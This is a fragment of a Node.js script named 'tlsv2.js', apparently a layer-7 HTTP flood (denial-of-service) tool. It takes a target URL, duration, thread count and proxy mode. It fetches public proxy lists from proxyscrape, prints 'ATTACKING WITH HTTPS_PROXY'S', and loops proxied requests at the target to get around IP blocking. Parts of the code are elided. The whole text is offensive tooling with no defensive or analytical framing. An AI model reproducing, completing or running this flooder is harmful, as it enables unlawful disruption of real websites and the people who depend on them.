...
async function main_process() {
    if (process.argv.length !== 6) {
        console.log(`Usage: node tlsv2.js <URL> <TIME> <TREADS> proxy`);
        console.log(`Coded By Zzmap this is ass code :D`);
        process.exit(0);
    }else{
        ...
        if (process.argv[5] == 'bypass') {
            ...
            console.log("ATTACKING WITH HTTPS_PROXY'S")
            const oxy_http = await axios.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all');
        ...
        function run() {
            if (process.argv[5] !== 'bypass') {
                ...
                proxiedRequest(config, function (error, response) {
                    console.log(response.statusCode,"zmaps");
                    if (proxies.length == 0) {
                        process.exit(0);
                    }
